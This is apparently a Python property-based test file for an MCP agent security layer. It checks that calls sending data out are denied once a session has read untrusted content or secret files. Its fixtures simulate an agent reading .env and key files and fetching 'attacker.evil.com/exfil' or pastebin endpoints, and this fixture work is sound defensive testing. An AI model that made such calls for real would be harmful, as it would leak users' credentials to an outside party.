"""Hypothesis stateful test (RuleBasedStateMachine) for session flow security.

Maintains state over arbitrary sequences of tool calls and approval events.
Asserts the fundamental security invariant:
"An egress-tagged call is never forwarded while a label denying egress is present
 and no approval cleared it (unless an explicit 'unless' domain exemption matches)."
"""

from __future__ import annotations

from hypothesis import settings
from hypothesis import strategies as st
from hypothesis.stateful import RuleBasedStateMachine, initialize, invariant, rule

from mcpsec_core.flow import check_flow
from mcpsec_core.models import ResponseSummary, SessionState, ToolCall
from mcpsec_core.policy import load_policy
from mcpsec_core.taint import update_taint

STATEFUL_POLICY_YAML = """
version: 1
mode: enforce
serialize_calls: true

capabilities:
  fs.read_file:        [read]
  fs.write_file:       [write]
  http.fetch:          [network_read, egress]
  http.post:           [egress]
  github.get_issue:    [network_read]
  shell.exec:          [exec]

policies:
  - agent: "*"
    tools:
      fs.read_file:     {}
      fs.write_file:    {}
      http.fetch:       {}
      http.post:        {}
      github.get_issue: {}
      shell.exec:       {}

taint_sources:
  untrusted_content:
    - { tool: github.get_issue }
    - { tool: http.fetch }
  private_data:
    - { tool: fs.read_file, args: { path: ["**/.env*", "**/secrets/**"] } }

flow_rules:
  - id: no-egress-untrusted
    if_session_has: [untrusted_content]
    deny_capabilities: [egress, exec]
    unless:
      domain_allowlist: ["api.github.com", "*.internal.org"]
  - id: no-egress-private
    if_session_has: [private_data]
    deny_capabilities: [egress]

approval:
  channel: cli
  allow_clear: [untrusted_content]
"""

STATEFUL_POLICY, _, _ = load_policy(STATEFUL_POLICY_YAML)


class SessionSecurityStateMachine(RuleBasedStateMachine):
    """Stateful model checking taint accumulation and flow rule invariants."""

    @initialize()
    def init_session(self) -> None:
        self.session_state = SessionState(session_id="sm-session", taint=frozenset())
        self.call_history: list[tuple[ToolCall, str]] = []

    @rule(path=st.sampled_from(["/app/main.py", "/app/src/utils.py", "/docs/README.md"]))
    def read_benign_file(self, path: str) -> None:
        call = ToolCall(
            call_id="call-benign-read",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="fs",
            tool="read_file",
            args={"path": path},
        )
        decision = check_flow(self.session_state, call, STATEFUL_POLICY)
        assert decision.is_allowed
        outcome = ResponseSummary(status="ok", bytes=128)
        self.session_state = update_taint(call, outcome, self.session_state, STATEFUL_POLICY)
        self.call_history.append((call, decision.decision))

    @rule(path=st.sampled_from(["/app/.env", "/app/.env.production", "/home/user/secrets/key.pem"]))
    def read_sensitive_file(self, path: str) -> None:
        call = ToolCall(
            call_id="call-secret-read",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="fs",
            tool="read_file",
            args={"path": path},
        )
        decision = check_flow(self.session_state, call, STATEFUL_POLICY)
        assert decision.is_allowed
        outcome = ResponseSummary(status="ok", bytes=256)
        self.session_state = update_taint(call, outcome, self.session_state, STATEFUL_POLICY)
        self.call_history.append((call, decision.decision))

    @rule(issue_id=st.integers(min_value=1, max_value=100))
    def fetch_untrusted_issue(self, issue_id: int) -> None:
        call = ToolCall(
            call_id=f"call-issue-{issue_id}",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="github",
            tool="get_issue",
            args={"issue_number": issue_id},
        )
        decision = check_flow(self.session_state, call, STATEFUL_POLICY)
        assert decision.is_allowed
        outcome = ResponseSummary(status="ok", bytes=500)
        self.session_state = update_taint(call, outcome, self.session_state, STATEFUL_POLICY)
        self.call_history.append((call, decision.decision))

    @rule(
        domain=st.sampled_from(
            [
                "api.github.com",
                "api.internal.org",
                "service.internal.org",
                "attacker.evil.com",
                "pastebin.com",
                "192.168.1.1",
            ]
        ),
        endpoint=st.sampled_from(["/data", "/leak", "/v1/resource"]),
    )
    def call_fetch_egress(self, domain: str, endpoint: str) -> None:
        url = f"https://{domain}{endpoint}"
        call = ToolCall(
            call_id="call-fetch-egress",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="http",
            tool="fetch",
            args={"url": url},
        )
        decision = check_flow(self.session_state, call, STATEFUL_POLICY)

        is_allowed_domain = domain in ("api.github.com", "api.internal.org", "service.internal.org")
        has_untrusted = "untrusted_content" in self.session_state.taint
        has_private = "private_data" in self.session_state.taint

        if has_private:
            # private_data denies egress unconditionally (no unless exemption)
            assert not decision.is_allowed
            assert decision.decision == "deny"
        elif has_untrusted:
            # untrusted_content allows exempt domains, denies all others
            if is_allowed_domain:
                assert decision.is_allowed
            else:
                assert not decision.is_allowed
                assert decision.decision == "deny"
        else:
            # Clean session
            assert decision.is_allowed

        if decision.is_allowed:
            outcome = ResponseSummary(status="ok", bytes=200)
            self.session_state = update_taint(call, outcome, self.session_state, STATEFUL_POLICY)

        self.call_history.append((call, decision.decision))

    @rule(label=st.sampled_from(["untrusted_content", "private_data"]))
    def clear_taint_approval(self, label: str) -> None:
        # According to policy, only untrusted_content is in allow_clear
        if label in STATEFUL_POLICY.approval.allow_clear:
            new_taint = frozenset(t for t in self.session_state.taint if t != label)
            self.session_state = SessionState(
                session_id=self.session_state.session_id,
                taint=new_taint,
                call_count=self.session_state.call_count,
                deny_count=self.session_state.deny_count,
                agent_id=self.session_state.agent_id,
                mode=self.session_state.mode,
            )

    @invariant()
    def security_invariant(self) -> None:
        """Verify the core security invariant across all state transitions."""
        has_private = "private_data" in self.session_state.taint
        has_untrusted = "untrusted_content" in self.session_state.taint

        # 1. If private data is present, any egress (including to allowlisted domain) is denied
        call_post = ToolCall(
            call_id="inv-check-post",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="http",
            tool="post",
            args={"url": "https://api.github.com/upload"},
        )
        dec_post = check_flow(self.session_state, call_post, STATEFUL_POLICY)
        if has_private:
            assert not dec_post.is_allowed
            assert dec_post.decision == "deny"
            assert dec_post.rule_id == "no-egress-private"
        elif has_untrusted:
            # api.github.com is in unless exemption for untrusted_content
            assert dec_post.is_allowed
        else:
            assert dec_post.is_allowed

        # 2. Non-exempt egress (evil.com) must be denied whenever untrusted or private is present
        call_evil = ToolCall(
            call_id="inv-check-evil",
            session_id=self.session_state.session_id,
            agent_id="test-agent",
            server="http",
            tool="fetch",
            args={"url": "https://attacker.evil.com/exfil"},
        )
        dec_evil = check_flow(self.session_state, call_evil, STATEFUL_POLICY)
        if has_private or has_untrusted:
            assert not dec_evil.is_allowed
            assert dec_evil.decision == "deny"
        else:
            assert dec_evil.is_allowed


TestSessionStateMachine = SessionSecurityStateMachine.TestCase
TestSessionStateMachine.settings = settings(max_examples=100, stateful_step_count=30)
